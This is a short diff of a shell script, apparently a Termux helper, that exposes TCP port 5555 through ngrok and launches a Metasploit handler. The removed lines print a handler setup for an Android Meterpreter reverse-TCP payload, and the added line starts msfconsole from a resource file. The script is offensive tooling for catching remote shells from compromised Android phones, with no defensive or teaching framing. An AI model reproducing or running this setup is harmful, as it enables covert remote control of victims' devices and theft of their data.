@@ -43,18 +43,7 @@ function sess1 {
 ngrok tcp 5555
 }
 function sess2 {
-printf "
-
-===============================
-msfconsole
-use exploit/multi/handler
-set  payload android/meterpreter/reverse_tcp
-set LHOST  localhost
-set LPORT 5555
-exploit
-
-===============================
-"
+msfconsole -q -r $PREFIX/lib/config-base
 }
 function sess3 {
 read -p "puerto: " puerto
